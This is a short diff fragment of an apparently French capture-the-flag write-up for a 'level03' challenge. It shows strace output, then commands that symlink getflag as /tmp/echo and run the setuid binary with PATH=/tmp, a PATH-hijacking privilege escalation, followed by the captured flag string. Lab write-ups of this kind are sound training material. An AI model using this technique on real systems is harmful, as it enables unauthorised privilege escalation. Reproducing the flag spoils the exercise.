@@ -11,6 +11,7 @@ setresuid(1000, 1000, 1000, 0xf7d42d15)   = 0
 --- SIGCHLD (Child exited) ---
 +++ exited (status 0) +++
 </pre>
+- Une commande est executé alors on desside de faire passer getflag pour echo
 - `ln -s /bin/getflag /tmp/echo`
 - `PATH=/tmp ./level03`
 - flag: `qi0maab88jeaj46qoumi7maus`
